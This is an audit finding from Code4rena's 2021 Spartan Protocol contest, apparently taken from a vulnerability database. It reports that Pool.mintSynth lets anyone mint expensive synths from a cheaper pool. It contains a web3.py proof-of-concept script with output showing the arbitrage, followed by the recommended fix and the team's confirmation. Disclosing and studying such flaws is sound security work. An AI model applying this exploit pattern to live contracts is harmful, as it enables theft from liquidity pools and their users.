---
# Core Classification
protocol: Spartan Protocol
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 494
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2021-07-spartan-protocol-contest
source_link: https://code4rena.com/reports/2021-07-spartan
github_link: https://github.com/code-423n4/2021-07-spartan-findings/issues/20

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - dexes
  - cdp
  - services
  - yield_aggregator
  - rwa

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - jonah1005
---

## Vulnerability Title

[H-09] arbitrary synth mint/burn from pool

### Overview


This bug report was filed by jonah1005 and is related to the Pool and Synth contracts. The vulnerability is that when there are multiple curated pools and synth, hackers can mint expensive synthetics from a cheaper AMM pool, and then burn the minted synth at the expensive pool in order to make a profit. This can be amplified with flash loan services and break all the pegs. The proof of concept is a web3.py script that mints arbitrary Synth in a pool, and the tool used is Hardhat. The recommended mitigation step is to check the provided synth's underlying token in the mintSynth function.

### Original Finding Content

_Submitted by jonah1005_

`Pool` can mint arbitrary `Synth` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.

[Pool's mintSynth logic](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242), [Synth's mintSynth logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171), and [Synth's authorization logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242).


The price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool

Here's a web3.py script of minting arbitrary `Synth` in a pool.
For simplicity, two pools are set with the assumption that link is 10x expensive than dai.

```python
sparta_amount = 100 * 10**18
initail_link_synth = link_synth.functions.balanceOf(user).call()
base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user})
link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})
after_link_synth = link_synth.functions.balanceOf(user).call()

print('get link synth amount from link pool:', after_link_synth - initail_link_synth)

sparta_amount = 100 * 10**18
initail_link_synth = link_synth.functions.balanceOf(user).call()
base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})
dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})
after_link_synth = link_synth.functions.balanceOf(user).call()

print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)

```

The log of the above script
```solidity
get link synth amount from link pool: 97078046905036524413
get link synth amount from dai pool: 970780469050365244136
```
Recommend Checking the provided synth's underlying token in `mintSynth`
```solidity
require(iSYNTH(synthOut).LayerONE() == TOKEN, "invalid synth");
```

**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/20#issuecomment-883837548):**
 > We agree and appreciate this finding being valid high risk issue.



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Spartan Protocol |
| Report Date | N/A |
| Finders | jonah1005 |

### Source Links

- **Source**: https://code4rena.com/reports/2021-07-spartan
- **GitHub**: https://github.com/code-423n4/2021-07-spartan-findings/issues/20
- **Contest**: https://code4rena.com/contests/2021-07-spartan-protocol-contest

### Keywords for Search

`vulnerability`

